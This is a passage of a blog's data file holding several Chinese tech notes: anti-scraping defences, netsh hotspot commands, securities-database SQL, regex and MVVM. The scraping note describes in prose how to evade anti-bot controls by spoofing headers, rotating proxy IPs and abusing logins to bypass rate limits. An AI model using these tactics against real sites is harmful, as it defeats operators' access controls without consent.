rel=\"noopener\">http://blog.csdn.net/nvzizhou/article/details/40342353</a></p>\n"},{"title":"爬虫，反爬虫，发爬虫对抗","date":"2018-06-18T08:04:15.000Z","_content":"#### 反爬虫\n\n- 1、根据频繁请求判断Ip，如果是有规律的大量请求，或者是无规律大量请求（有时可以设置随机数时间，更换代理IP），直接封IP段\n- 2、对查询数据加验证码，验证码一定要复杂，如果太简单直接通过OCR可破解\n- 3、对于模糊查询，只返回5条数据，爱咋咋地，对于一些关键词直接屏蔽（公司、工厂、企业等等）\n- 4、如果你有App记得加验证码，别只PC端加验证码\n- 5、通过在服务端设置token的形式，同时给定有效时间\n- 6、添加监控程序，监控每天的异常数据\n以上几条足以让好多爬数据者直接档在门外\n\n#### 反爬虫对抗\n\n- 通过Headers反爬虫\n\n    从用户请求的Headers反爬虫是最常见的反爬虫策略。很多网站都会对Headers的User-Agent进行检测，还有一部分网站会对Referer进行检测（一些资源网站的防盗链就是检测Referer）。如果遇到了这类反爬虫机制，可以直接在爬虫中添加Headers，将浏览器的User-Agent复制到爬虫的Headers中；或者将Referer值修改为目标网站域名。对于检测Headers的反爬虫，在爬虫中修改或者添加Headers就能很好的绕过。\n\n- 基于用户行为反爬虫\n\n    还有一部分网站是通过检测用户行为，例如同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作。\n\n    大多数网站都是前一种情况，对于这种情况，使用IP代理就可以解决。可以专门写一个爬虫，爬取网上公开的代理ip，检测后全部保存起来。这样的代理ip爬虫经常会用到，最好自己准备一个。有了大量代理ip后可以每请求几次更换一个ip，这在requests或者urllib2中很容易做到，这样就能很容易的绕过第一种反爬虫。\n\n    对于第二种情况，可以在每次请求后随机间隔几秒再进行下一次请求。有些有逻辑漏洞的网站，可以通过请求几次，退出登录，重新登录，继续请求来绕过同一账号短时间内不能多次进行相同请求的限制。\n\n- 动态页面的反爬虫\n\n    上述的几种情况大多都是出现在静态页面，还有一部分网站，我们需要爬取的数据是通过ajax请求得到，或者通过JavaScript生成的。首先用Firebug或者HttpFox对网络请求进行分析。如果能够找到ajax请求，也能分析出具体的参数和响应的具体含义，我们就能采用上面的方法，直接利用requests或者urllib2模拟ajax请求，对响应的json进行分析得到需要的数据。\n    \n    能够直接模拟ajax请求获取数据固然是极好的，但是有些网站把ajax请求的所有参数全部加密了。我们根本没办法构造自己所需要的数据的请求。我这几天爬的那个网站就是这样，除了加密ajax参数，它还把一些基本的功能都封装了，全部都是在调用自己的接口，而接口参数都是加密的。遇到这样的网站，我们就不能用上面的方法了，我用的是selenium+phantomJS框架，调用浏览器内核，并利用phantomJS执行js来模拟人为操作以及触发页面中的js脚本。从填写表单到点击按钮再到滚动页面，全部都可以模拟，不考虑具体的请求和响应过程，只是完完整整的把人浏览页面获取数据的过程模拟一遍。","source":"_posts/爬虫，反爬虫，发爬虫对抗.md","raw":"---\ntitle: 爬虫，反爬虫，发爬虫对抗\ndate: 2018-06-18 16:04:15\ntags: note\n---\n#### 反爬虫\n\n- 1、根据频繁请求判断Ip，如果是有规律的大量请求，或者是无规律大量请求（有时可以设置随机数时间，更换代理IP），直接封IP段\n- 2、对查询数据加验证码，验证码一定要复杂，如果太简单直接通过OCR可破解\n- 3、对于模糊查询，只返回5条数据，爱咋咋地，对于一些关键词直接屏蔽（公司、工厂、企业等等）\n- 4、如果你有App记得加验证码，别只PC端加验证码\n- 5、通过在服务端设置token的形式，同时给定有效时间\n- 6、添加监控程序，监控每天的异常数据\n以上几条足以让好多爬数据者直接档在门外\n\n#### 反爬虫对抗\n\n- 通过Headers反爬虫\n\n    从用户请求的Headers反爬虫是最常见的反爬虫策略。很多网站都会对Headers的User-Agent进行检测，还有一部分网站会对Referer进行检测（一些资源网站的防盗链就是检测Referer）。如果遇到了这类反爬虫机制，可以直接在爬虫中添加Headers，将浏览器的User-Agent复制到爬虫的Headers中；或者将Referer值修改为目标网站域名。对于检测Headers的反爬虫，在爬虫中修改或者添加Headers就能很好的绕过。\n\n- 基于用户行为反爬虫\n\n    还有一部分网站是通过检测用户行为，例如同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作。\n\n    大多数网站都是前一种情况，对于这种情况，使用IP代理就可以解决。可以专门写一个爬虫，爬取网上公开的代理ip，检测后全部保存起来。这样的代理ip爬虫经常会用到，最好自己准备一个。有了大量代理ip后可以每请求几次更换一个ip，这在requests或者urllib2中很容易做到，这样就能很容易的绕过第一种反爬虫。\n\n    对于第二种情况，可以在每次请求后随机间隔几秒再进行下一次请求。有些有逻辑漏洞的网站，可以通过请求几次，退出登录，重新登录，继续请求来绕过同一账号短时间内不能多次进行相同请求的限制。\n\n- 动态页面的反爬虫\n\n    上述的几种情况大多都是出现在静态页面，还有一部分网站，我们需要爬取的数据是通过ajax请求得到，或者通过JavaScript生成的。首先用Firebug或者HttpFox对网络请求进行分析。如果能够找到ajax请求，也能分析出具体的参数和响应的具体含义，我们就能采用上面的方法，直接利用requests或者urllib2模拟ajax请求，对响应的json进行分析得到需要的数据。\n    \n    能够直接模拟ajax请求获取数据固然是极好的，但是有些网站把ajax请求的所有参数全部加密了。我们根本没办法构造自己所需要的数据的请求。我这几天爬的那个网站就是这样，除了加密ajax参数，它还把一些基本的功能都封装了，全部都是在调用自己的接口，而接口参数都是加密的。遇到这样的网站，我们就不能用上面的方法了，我用的是selenium+phantomJS框架，调用浏览器内核，并利用phantomJS执行js来模拟人为操作以及触发页面中的js脚本。从填写表单到点击按钮再到滚动页面，全部都可以模拟，不考虑具体的请求和响应过程，只是完完整整的把人浏览页面获取数据的过程模拟一遍。","slug":"爬虫，反爬虫，发爬虫对抗","published":1,"updated":"2018-07-10T13:10:09.860Z","_id":"cjjedmh7n000u0gtjvods55rp","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"反爬虫\"><a href=\"#反爬虫\" class=\"headerlink\" title=\"反爬虫\"></a>反爬虫</h4><ul>\n<li>1、根据频繁请求判断Ip，如果是有规律的大量请求，或者是无规律大量请求（有时可以设置随机数时间，更换代理IP），直接封IP段</li>\n<li>2、对查询数据加验证码，验证码一定要复杂，如果太简单直接通过OCR可破解</li>\n<li>3、对于模糊查询，只返回5条数据，爱咋咋地，对于一些关键词直接屏蔽（公司、工厂、企业等等）</li>\n<li>4、如果你有App记得加验证码，别只PC端加验证码</li>\n<li>5、通过在服务端设置token的形式，同时给定有效时间</li>\n<li>6、添加监控程序，监控每天的异常数据<br>以上几条足以让好多爬数据者直接档在门外</li>\n</ul>\n<h4 id=\"反爬虫对抗\"><a href=\"#反爬虫对抗\" class=\"headerlink\" title=\"反爬虫对抗\"></a>反爬虫对抗</h4><ul>\n<li><p>通过Headers反爬虫</p>\n<p>  从用户请求的Headers反爬虫是最常见的反爬虫策略。很多网站都会对Headers的User-Agent进行检测，还有一部分网站会对Referer进行检测（一些资源网站的防盗链就是检测Referer）。如果遇到了这类反爬虫机制，可以直接在爬虫中添加Headers，将浏览器的User-Agent复制到爬虫的Headers中；或者将Referer值修改为目标网站域名。对于检测Headers的反爬虫，在爬虫中修改或者添加Headers就能很好的绕过。</p>\n</li>\n<li><p>基于用户行为反爬虫</p>\n<p>  还有一部分网站是通过检测用户行为，例如同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作。</p>\n<p>  大多数网站都是前一种情况，对于这种情况，使用IP代理就可以解决。可以专门写一个爬虫，爬取网上公开的代理ip，检测后全部保存起来。这样的代理ip爬虫经常会用到，最好自己准备一个。有了大量代理ip后可以每请求几次更换一个ip，这在requests或者urllib2中很容易做到，这样就能很容易的绕过第一种反爬虫。</p>\n<p>  对于第二种情况，可以在每次请求后随机间隔几秒再进行下一次请求。有些有逻辑漏洞的网站，可以通过请求几次，退出登录，重新登录，继续请求来绕过同一账号短时间内不能多次进行相同请求的限制。</p>\n</li>\n<li><p>动态页面的反爬虫</p>\n<p>  上述的几种情况大多都是出现在静态页面，还有一部分网站，我们需要爬取的数据是通过ajax请求得到，或者通过JavaScript生成的。首先用Firebug或者HttpFox对网络请求进行分析。如果能够找到ajax请求，也能分析出具体的参数和响应的具体含义，我们就能采用上面的方法，直接利用requests或者urllib2模拟ajax请求，对响应的json进行分析得到需要的数据。</p>\n<p>  能够直接模拟ajax请求获取数据固然是极好的，但是有些网站把ajax请求的所有参数全部加密了。我们根本没办法构造自己所需要的数据的请求。我这几天爬的那个网站就是这样，除了加密ajax参数，它还把一些基本的功能都封装了，全部都是在调用自己的接口，而接口参数都是加密的。遇到这样的网站，我们就不能用上面的方法了，我用的是selenium+phantomJS框架，调用浏览器内核，并利用phantomJS执行js来模拟人为操作以及触发页面中的js脚本。从填写表单到点击按钮再到滚动页面，全部都可以模拟，不考虑具体的请求和响应过程，只是完完整整的把人浏览页面获取数据的过程模拟一遍。</p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"反爬虫\"><a href=\"#反爬虫\" class=\"headerlink\" title=\"反爬虫\"></a>反爬虫</h4><ul>\n<li>1、根据频繁请求判断Ip，如果是有规律的大量请求，或者是无规律大量请求（有时可以设置随机数时间，更换代理IP），直接封IP段</li>\n<li>2、对查询数据加验证码，验证码一定要复杂，如果太简单直接通过OCR可破解</li>\n<li>3、对于模糊查询，只返回5条数据，爱咋咋地，对于一些关键词直接屏蔽（公司、工厂、企业等等）</li>\n<li>4、如果你有App记得加验证码，别只PC端加验证码</li>\n<li>5、通过在服务端设置token的形式，同时给定有效时间</li>\n<li>6、添加监控程序，监控每天的异常数据<br>以上几条足以让好多爬数据者直接档在门外</li>\n</ul>\n<h4 id=\"反爬虫对抗\"><a href=\"#反爬虫对抗\" class=\"headerlink\" title=\"反爬虫对抗\"></a>反爬虫对抗</h4><ul>\n<li><p>通过Headers反爬虫</p>\n<p>  从用户请求的Headers反爬虫是最常见的反爬虫策略。很多网站都会对Headers的User-Agent进行检测，还有一部分网站会对Referer进行检测（一些资源网站的防盗链就是检测Referer）。如果遇到了这类反爬虫机制，可以直接在爬虫中添加Headers，将浏览器的User-Agent复制到爬虫的Headers中；或者将Referer值修改为目标网站域名。对于检测Headers的反爬虫，在爬虫中修改或者添加Headers就能很好的绕过。</p>\n</li>\n<li><p>基于用户行为反爬虫</p>\n<p>  还有一部分网站是通过检测用户行为，例如同一IP短时间内多次访问同一页面，或者同一账户短时间内多次进行相同操作。</p>\n<p>  大多数网站都是前一种情况，对于这种情况，使用IP代理就可以解决。可以专门写一个爬虫，爬取网上公开的代理ip，检测后全部保存起来。这样的代理ip爬虫经常会用到，最好自己准备一个。有了大量代理ip后可以每请求几次更换一个ip，这在requests或者urllib2中很容易做到，这样就能很容易的绕过第一种反爬虫。</p>\n<p>  对于第二种情况，可以在每次请求后随机间隔几秒再进行下一次请求。有些有逻辑漏洞的网站，可以通过请求几次，退出登录，重新登录，继续请求来绕过同一账号短时间内不能多次进行相同请求的限制。</p>\n</li>\n<li><p>动态页面的反爬虫</p>\n<p>  上述的几种情况大多都是出现在静态页面，还有一部分网站，我们需要爬取的数据是通过ajax请求得到，或者通过JavaScript生成的。首先用Firebug或者HttpFox对网络请求进行分析。如果能够找到ajax请求，也能分析出具体的参数和响应的具体含义，我们就能采用上面的方法，直接利用requests或者urllib2模拟ajax请求，对响应的json进行分析得到需要的数据。</p>\n<p>  能够直接模拟ajax请求获取数据固然是极好的，但是有些网站把ajax请求的所有参数全部加密了。我们根本没办法构造自己所需要的数据的请求。我这几天爬的那个网站就是这样，除了加密ajax参数，它还把一些基本的功能都封装了，全部都是在调用自己的接口，而接口参数都是加密的。遇到这样的网站，我们就不能用上面的方法了，我用的是selenium+phantomJS框架，调用浏览器内核，并利用phantomJS执行js来模拟人为操作以及触发页面中的js脚本。从填写表单到点击按钮再到滚动页面，全部都可以模拟，不考虑具体的请求和响应过程，只是完完整整的把人浏览页面获取数据的过程模拟一遍。</p>\n</li>\n</ul>\n"},{"title":"笔记本开wifi","date":"2018-06-18T08:04:15.000Z","_content":"http://jingyan.baidu.com/article/c275f6baed0507e33c756775.html\nhttp://blog.csdn.net/jhycjhyc/article/details/13770003\n\n#### 1.设置\n\n    netsh wlan set hostednetwork mode=allow ssid=name key=password\n    \n#### 2.打开网络管理共享能联通的网络\n。。。。\n\n#### 3.启动\n    \n    netsh wlan start hostednetwork","source":"_posts/笔记本开wifi.md","raw":"---\ntitle: 笔记本开wifi\ndate: 2018-06-18 16:04:15\ntags: note\n---\nhttp://jingyan.baidu.com/article/c275f6baed0507e33c756775.html\nhttp://blog.csdn.net/jhycjhyc/article/details/13770003\n\n#### 1.设置\n\n    netsh wlan set hostednetwork mode=allow ssid=name key=password\n    \n#### 2.打开网络管理共享能联通的网络\n。。。。\n\n#### 3.启动\n    \n    netsh wlan start hostednetwork","slug":"笔记本开wifi","published":1,"updated":"2018-07-10T13:10:09.861Z","_id":"cjjedmh7o000w0gtjn26nndew","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"http://jingyan.baidu.com/article/c275f6baed0507e33c756775.html\" target=\"_blank\" rel=\"noopener\">http://jingyan.baidu.com/article/c275f6baed0507e33c756775.html</a><br><a href=\"http://blog.csdn.net/jhycjhyc/article/details/13770003\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/jhycjhyc/article/details/13770003</a></p>\n<h4 id=\"1-设置\"><a href=\"#1-设置\" class=\"headerlink\" title=\"1.设置\"></a>1.设置</h4><pre><code>netsh wlan set hostednetwork mode=allow ssid=name key=password\n</code></pre><h4 id=\"2-打开网络管理共享能联通的网络\"><a href=\"#2-打开网络管理共享能联通的网络\" class=\"headerlink\" title=\"2.打开网络管理共享能联通的网络\"></a>2.打开网络管理共享能联通的网络</h4><p>。。。。</p>\n<h4 id=\"3-启动\"><a href=\"#3-启动\" class=\"headerlink\" title=\"3.启动\"></a>3.启动</h4><pre><code>netsh wlan start hostednetwork\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://jingyan.baidu.com/article/c275f6baed0507e33c756775.html\" target=\"_blank\" rel=\"noopener\">http://jingyan.baidu.com/article/c275f6baed0507e33c756775.html</a><br><a href=\"http://blog.csdn.net/jhycjhyc/article/details/13770003\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/jhycjhyc/article/details/13770003</a></p>\n<h4 id=\"1-设置\"><a href=\"#1-设置\" class=\"headerlink\" title=\"1.设置\"></a>1.设置</h4><pre><code>netsh wlan set hostednetwork mode=allow ssid=name key=password\n</code></pre><h4 id=\"2-打开网络管理共享能联通的网络\"><a href=\"#2-打开网络管理共享能联通的网络\" class=\"headerlink\" title=\"2.打开网络管理共享能联通的网络\"></a>2.打开网络管理共享能联通的网络</h4><p>。。。。</p>\n<h4 id=\"3-启动\"><a href=\"#3-启动\" class=\"headerlink\" title=\"3.启动\"></a>3.启动</h4><pre><code>netsh wlan start hostednetwork\n</code></pre>"},{"title":"适当性二期sql","date":"2018-06-18T08:04:15.000Z","_content":"```\n\n-- 测评日期，测评到期日\nSELECT\n  client_id,\n  corp_begin_date,\n  corp_end_date\nFROM hs_asset.clientprefer; --where client_id = @client_id;\n\n--2.\n--开户天数,organ_flag--> select organ_flag from client where client_id = @client_id\nSELECT\n  organ_flag,\n  open_days\nFROM hs_asset.eligpaper\nWHERE paper_type = '1' AND prodta_no = ' ';\n\n-- 试卷获取\nSELECT\n  a.*,\n  b.question_type,\n  b.question_kind,\n  b.question_content,\n  b.open_date\n\nFROM hs_asset.eligpaperquestrel a, hs_asset.eligquestion b\n\nWHERE a.paper_type = '1' AND a.prodta_no = ' ' AND a.question_no = b.question_no\n\nORDER BY a.order_no, a.paper_type, a.organ_flag ASC;\n\n\n\nSELECT STOCK_CODE from HS_DATA.HIS_PRICE;\n\n-- 3.答案获取 client_id = @client_id paper_answer like '%*'\nSELECT\n  paper_answer,\n  CLIENT_ID\nFROM hs_his.his_eligtestjour\nWHERE paper_type = '1' AND prodta_no = ' ';\n\nselect init_date, client_id,paper_answer,position_str from hs_his.his_eligtestjour where  paper_type = '1' and prodta_no = ' '","source":"_posts/适当性二期sql.md","raw":"---\ntitle: 适当性二期sql\ndate: 2018-06-18 16:04:15\ntags: note\n---\n```\n\n-- 测评日期，测评到期日\nSELECT\n  client_id,\n  corp_begin_date,\n  corp_end_date\nFROM hs_asset.clientprefer; --where client_id = @client_id;\n\n--2.\n--开户天数,organ_flag--> select organ_flag from client where client_id = @client_id\nSELECT\n  organ_flag,\n  open_days\nFROM hs_asset.eligpaper\nWHERE paper_type = '1' AND prodta_no = ' ';\n\n-- 试卷获取\nSELECT\n  a.*,\n  b.question_type,\n  b.question_kind,\n  b.question_content,\n  b.open_date\n\nFROM hs_asset.eligpaperquestrel a, hs_asset.eligquestion b\n\nWHERE a.paper_type = '1' AND a.prodta_no = ' ' AND a.question_no = b.question_no\n\nORDER BY a.order_no, a.paper_type, a.organ_flag ASC;\n\n\n\nSELECT STOCK_CODE from HS_DATA.HIS_PRICE;\n\n-- 3.答案获取 client_id = @client_id paper_answer like '%*'\nSELECT\n  paper_answer,\n  CLIENT_ID\nFROM hs_his.his_eligtestjour\nWHERE paper_type = '1' AND prodta_no = ' ';\n\nselect init_date, client_id,paper_answer,position_str from hs_his.his_eligtestjour where  paper_type = '1' and prodta_no = ' '","slug":"适当性二期sql","published":1,"updated":"2018-07-10T13:10:09.864Z","_id":"cjjedmh7p000y0gtjo8j3n7es","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code></p>\n<p>– 测评日期，测评到期日<br>SELECT<br>  client_id,<br>  corp_begin_date,<br>  corp_end_date<br>FROM hs_asset.clientprefer; –where client_id = @client_id;</p>\n<p>–2.<br>–开户天数,organ_flag–&gt; select organ_flag from client where client_id = @client_id<br>SELECT<br>  organ_flag,<br>  open_days<br>FROM hs_asset.eligpaper<br>WHERE paper_type = ‘1’ AND prodta_no = ‘ ‘;</p>\n<p>– 试卷获取<br>SELECT<br>  a.*,<br>  b.question_type,<br>  b.question_kind,<br>  b.question_content,<br>  b.open_date</p>\n<p>FROM hs_asset.eligpaperquestrel a, hs_asset.eligquestion b</p>\n<p>WHERE a.paper_type = ‘1’ AND a.prodta_no = ‘ ‘ AND a.question_no = b.question_no</p>\n<p>ORDER BY a.order_no, a.paper_type, a.organ_flag ASC;</p>\n<p>SELECT STOCK_CODE from HS_DATA.HIS_PRICE;</p>\n<p>– 3.答案获取 client_id = @client_id paper_answer like ‘%*’<br>SELECT<br>  paper_answer,<br>  CLIENT_ID<br>FROM hs_his.his_eligtestjour<br>WHERE paper_type = ‘1’ AND prodta_no = ‘ ‘;</p>\n<p>select init_date, client_id,paper_answer,position_str from hs_his.his_eligtestjour where  paper_type = ‘1’ and prodta_no = ‘ ‘</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code></p>\n<p>– 测评日期，测评到期日<br>SELECT<br>  client_id,<br>  corp_begin_date,<br>  corp_end_date<br>FROM hs_asset.clientprefer; –where client_id = @client_id;</p>\n<p>–2.<br>–开户天数,organ_flag–&gt; select organ_flag from client where client_id = @client_id<br>SELECT<br>  organ_flag,<br>  open_days<br>FROM hs_asset.eligpaper<br>WHERE paper_type = ‘1’ AND prodta_no = ‘ ‘;</p>\n<p>– 试卷获取<br>SELECT<br>  a.*,<br>  b.question_type,<br>  b.question_kind,<br>  b.question_content,<br>  b.open_date</p>\n<p>FROM hs_asset.eligpaperquestrel a, hs_asset.eligquestion b</p>\n<p>WHERE a.paper_type = ‘1’ AND a.prodta_no = ‘ ‘ AND a.question_no = b.question_no</p>\n<p>ORDER BY a.order_no, a.paper_type, a.organ_flag ASC;</p>\n<p>SELECT STOCK_CODE from HS_DATA.HIS_PRICE;</p>\n<p>– 3.答案获取 client_id = @client_id paper_answer like ‘%*’<br>SELECT<br>  paper_answer,<br>  CLIENT_ID<br>FROM hs_his.his_eligtestjour<br>WHERE paper_type = ‘1’ AND prodta_no = ‘ ‘;</p>\n<p>select init_date, client_id,paper_answer,position_str from hs_his.his_eligtestjour where  paper_type = ‘1’ and prodta_no = ‘ ‘</p>\n"},{"title":"正则","date":"2018-06-18T08:04:15.000Z","_content":"- #### 非 ^\n[^a]* 表示匹配除a以外的所有字符\n\n[^abc]* 表示匹配除a、b、c以外的所有字符，注意，是字符，而不是字符串，即a,b,c字符均不匹配\n\n- #### 匹配次数{m,n}\n\n.{1}匹配任意字符一次","source":"_posts/正则.md","raw":"---\ntitle: 正则\ndate: 2018-06-18 16:04:15\ntags: note\n---\n- #### 非 ^\n[^a]* 表示匹配除a以外的所有字符\n\n[^abc]* 表示匹配除a、b、c以外的所有字符，注意，是字符，而不是字符串，即a,b,c字符均不匹配\n\n- #### 匹配次数{m,n}\n\n.{1}匹配任意字符一次","slug":"正则","published":1,"updated":"2018-07-10T13:10:09.858Z","_id":"cjjedmh7r00100gtjpl5xjyzp","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"非\"><a href=\"#非\" class=\"headerlink\" title=\"非 ^\"></a>非 ^</h4>[^a]* 表示匹配除a以外的所有字符</li>\n</ul>\n<p>[^abc]* 表示匹配除a、b、c以外的所有字符，注意，是字符，而不是字符串，即a,b,c字符均不匹配</p>\n<ul>\n<li><h4 id=\"匹配次数-m-n\"><a href=\"#匹配次数-m-n\" class=\"headerlink\" title=\"匹配次数{m,n}\"></a>匹配次数{m,n}</h4></li>\n</ul>\n<p>.{1}匹配任意字符一次</p>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"非\"><a href=\"#非\" class=\"headerlink\" title=\"非 ^\"></a>非 ^</h4>[^a]* 表示匹配除a以外的所有字符</li>\n</ul>\n<p>[^abc]* 表示匹配除a、b、c以外的所有字符，注意，是字符，而不是字符串，即a,b,c字符均不匹配</p>\n<ul>\n<li><h4 id=\"匹配次数-m-n\"><a href=\"#匹配次数-m-n\" class=\"headerlink\" title=\"匹配次数{m,n}\"></a>匹配次数{m,n}</h4></li>\n</ul>\n<p>.{1}匹配任意字符一次</p>\n"},{"title":"结构","date":"2018-06-18T08:04:15.000Z","_content":"- 注解，反射\n- 看书 Java性能优化\n- 规则bean文件\n- 配置需要数据，运算规则写在代码\n- 标签bean文件\n- 工厂模式，多态\n- 周期配置，开始时间\n- 清算时间，交易日","source":"_posts/结构.md","raw":"---\ntitle: 结构\ndate: 2018-06-18 16:04:15\ntags: note\n---\n- 注解，反射\n- 看书 Java性能优化\n- 规则bean文件\n- 配置需要数据，运算规则写在代码\n- 标签bean文件\n- 工厂模式，多态\n- 周期配置，开始时间\n- 清算时间，交易日","slug":"结构","published":1,"updated":"2018-07-10T13:10:09.862Z","_id":"cjjedmh7s00120gtjva7junj7","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li>注解，反射</li>\n<li>看书 Java性能优化</li>\n<li>规则bean文件</li>\n<li>配置需要数据，运算规则写在代码</li>\n<li>标签bean文件</li>\n<li>工厂模式，多态</li>\n<li>周期配置，开始时间</li>\n<li>清算时间，交易日</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li>注解，反射</li>\n<li>看书 Java性能优化</li>\n<li>规则bean文件</li>\n<li>配置需要数据，运算规则写在代码</li>\n<li>标签bean文件</li>\n<li>工厂模式，多态</li>\n<li>周期配置，开始时间</li>\n<li>清算时间，交易日</li>\n</ul>\n"},{"title":"设计模式--MVVM","date":"2018-06-18T08:04:15.000Z","_content":"### 1.关联模式\n> #### MVC\n\n- 视图（View）：用户界面。 \n- 控制器（Controller）：业务逻辑\n- 模型（Model）：数据保存\n\nView 传送指令到 Controller\n\nController 完成业务逻辑后，要求 Model 改变状态\n\nModel 将新的数据发送到 View，用户得到反馈\n\n\n\n\n> #### MVP\n\n- Model 提供数据\n- View 负责显示\n- Presenter 负责逻辑的处理\n\n各部分之间的通信，都是双向的。\n\nView 与 Model 不发生联系，都通过 Presenter 传递。\n\nView 非常薄，不部署任何业务逻辑，称为\"被动视图\"（Passive View），即没有任何主动性，而Presenter非常厚，所有逻辑都部署在那里。\n\n---\n### 2.MVVM\n- Model 提供数据\n- View 负责显示\n- ViewModel 处理用户输入，反馈数据变化\n\n[比如AngualrJS](http://baidu.com/)\n\nMVVM与MVP最大的不同就在于View与ViewModel交互的时候使用了松耦合的双向绑定，而不是像View与Presenter那样直接交互。ViewModel作为View的数据映射，通常View上有什么属性，ViewModel上也会存在相应的一个属性，这两个属性通过事件实现了双向的绑定，常见的MVVM框架都替我们完成了这样的绑定过程。 ","source":"_posts/设计模式--MVVM.md","raw":"---\ntitle: 设计模式--MVVM\ndate: 2018-06-18 16:04:15\ntags: note\n---\n### 1.关联模式\n> #### MVC\n\n- 视图（View）：用户界面。 \n- 控制器（Controller）：业务逻辑\n- 模型（Model）：数据保存\n\nView 传送指令到 Controller\n\nController 完成业务逻辑后，要求 Model 改变状态\n\nModel 将新的数据发送到 View，用户得到反馈\n\n\n\n\n> #### MVP\n\n- Model 提供数据\n- View 负责显示\n- Presenter 负责逻辑的处理\n\n各部分之间的通信，都是双向的。\n\nView 与 Model 不发生联系，都通过 Presenter 传递。\n\nView 非常薄，不部署任何业务逻辑，称为\"被动视图\"（Passive View），即没有任何主动性，而Presenter非常厚，所有逻辑都部署在那里。\n\n---\n### 2.MVVM\n- Model 提供数据\n- View 负责显示\n- ViewModel 处理用户输入，反馈数据变化\n\n[比如AngualrJS](http://baidu.com/)\n\nMVVM与MVP最大的不同就在于View与ViewModel交互的时候使用了松耦合的双向绑定，而不是像View与Presenter那样直接交互。ViewModel作为View的数据映射，通常View上有什么属性，ViewModel上也会存在相应的一个属性，这两个属性通过事件实现了双向的绑定，常见的MVVM框架都替我们完成了这样的绑定过程。 ","slug":"设计模式--MVVM","published":1,"updated":"2018-07-10T13:10:09.863Z","_id":"cjjedmh7t00140gtjqpfuoxup","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"1-关联模式\"><a href=\"#1-关联模式\" class=\"headerlink\" title=\"1.关联模式\"></a>1.关联模式</h3><blockquote>\n<h4 id=\"MVC\"><a href=\"#MVC\" class=\"headerlink\" title=\"MVC\"></a>MVC</h4></blockquote>\n<ul>\n<li>视图（View）：用户界面。 </li>\n<li>控制器（Controller）：业务逻辑</li>\n<li>模型（Model）：数据保存</li>\n</ul>\n<p>View 传送指令到 Controller</p>\n<p>Controller 完成业务逻辑后，要求 Model 改变状态</p>\n<p>Model 将新的数据发送到 View，用户得到反馈</p>\n<blockquote>\n<h4 id=\"MVP\"><a href=\"#MVP\" class=\"headerlink\" title=\"MVP\"></a>MVP</h4></blockquote>\n<ul>\n<li>Model 提供数据</li>\n<li>View 负责显示</li>\n<li>Presenter 负责逻辑的处理</li>\n</ul>\n<p>各部分之间的通信，都是双向的。</p>\n<p>View 与 Model 不发生联系，都通过 Presenter 传递。</p>\n<p>View 非常薄，不部署任何业务逻辑，称为”被动视图”（Passive View），即没有任何主动性，而Presenter非常厚，所有逻辑都部署在那里。</p>\n<hr>\n<h3 id=\"2-MVVM\"><a href=\"#2-MVVM\" class=\"headerlink\" title=\"2.MVVM\"></a>2.MVVM</h3><ul>\n<li>Model 提供数据</li>\n<li>View 负责显示</li>\n<li>ViewModel 处理用户输入，反馈数据变化</li>\n</ul>\n<p><a href=\"http://baidu.com/\" target=\"_blank\" rel=\"noopener\">比如AngualrJS</a></p>\n<p>MVVM与MVP最大的不同就在于View与ViewModel交互的时候使用了松耦合的双向绑定，而不是像View与Presenter那样直接交互。ViewModel作为View的数据映射，通常View上有什么属性，ViewModel上也会存在相应的一个属性，这两个属性通过事件实现了双向的绑定，常见的MVVM框架都替我们完成了这样的绑定过程。 </p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-关联模式\"><a href=\"#1-关联模式\" class=\"headerlink\" title=\"1.关联模式\"></a>1.关联模式</h3><blockquote>\n<h4 id=\"MVC\"><a href=\"#MVC\" class=\"headerlink\" title=\"MVC\"></a>MVC</h4></blockquote>\n<ul>\n<li>视图（View）：用户界面。 </li>\n<li>控制器（Controller）：业务逻辑</li>\n<li>模型（Model）：数据保存</li>\n</ul>\n<p>View 传送指令到 Controller</p>\n<p>Controller 完成业务逻辑后，要求 Model 改变状态</p>\n<p>Model 将新的数据发送到 View，用户得到反馈</p>\n<blockquote>\n<h4 id=\"MVP\"><a href=\"#MVP\" class=\"headerlink\" title=\"MVP\"></a>MVP</h4></blockquote>\n<ul>\n<li>Model 提供数据</li>\n<li>View 负责显示</li>\n<li>Presenter 负责逻辑的处理</li>\n</ul>\n<p>各部分之间的通信，都是双向的。</p>\n<p>View 与 Model 不发生联系，都通过 Presenter 传递。</p>\n<p>View 非常薄，不部署任何业务逻辑，称为”被动视图”（Passive View），即没有任何主动性，而Presenter非常厚，所有逻辑都部署在那里。</p>\n<hr>\n<h3 id=\"2-MVVM\"><a href=\"#2-MVVM\" class=\"headerlink\" title=\"2.MVVM\"></a>2.MVVM</h3><ul>\n<li>Model 提供数据</li>\n<li>View 负责显示</li>\n<li>ViewModel 处理用户输入，反馈数据变化</li>\n</ul>\n<p><a href=\"http://baidu.com/\" target=\"_blank\" rel=\"noopener\">比如AngualrJS</a></p>\n<p>MVVM与MVP最大的不同就在于View与ViewModel交互的时候使用了松耦合的双向绑定，而不是像View与Presenter那样直接交互。ViewModel作为View的数据映射，通常View上有什么属性，ViewModel上也会存在相应的一个属性，这两个属性通过事件实现了双向的绑定，常见的MVVM框架都替我们完成了这样的绑定过程。 </p>\n"},{"title":"问题","date":"2018-06-18T08:04:15.000Z","_content":"1. 编码要不要转成对应的文字\n2. 城市代码不是字典项，怎么处理\n","source":"_posts/问题.md","raw":"---\ntitle: 问题\ndate: 2018-06-18 16:04:15\ntags: note\n---\n1. 编码要不要转成对应的文字\n2. 